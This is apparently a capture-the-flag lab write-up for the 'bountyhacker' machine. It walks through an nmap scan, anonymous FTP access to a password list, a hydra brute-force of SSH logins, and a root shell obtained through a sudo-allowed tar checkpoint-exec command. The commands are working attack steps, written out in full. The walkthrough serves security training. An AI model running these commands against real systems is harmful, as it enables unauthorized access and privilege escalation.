# Enumeration

I first ran a Nmap service scan to detect open services.

```
nmap -sC -sV 10.10.10.10
```

This returned port 21(ftp), 22(ssh), 80(http). The good thing about running `-sC` (default scripts) is that it identified anonymous FTP login. So, we can connect via FTP.

```
ftp 10.10.10.10
```

One of the files available to us is `locks.txt`, which contains a list of what looks to be passwords.

# Exploitation

On the webserver, we're given a list of members of the 'Red Dragon Syndicate'.

```
spike
jet
ed
edward
ein
faye
lin
```

We can use this list of users with the list of passwords to see if we can crack into SSH.

```
hydra -L users.txt -P locks.txt 10.10.10.10 ssh
```

We were able to get access to `lin`!

# Privilege Escalation

Taking a look at `sudo -l`

```
User lin may run the following commands on bountyhacker:
```

GTFOBins has some nifty `tar` commands which can help escalate privileges.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This command will allow us to execute `/bin/sh` as sudo, and thus give us a shell as `root`!
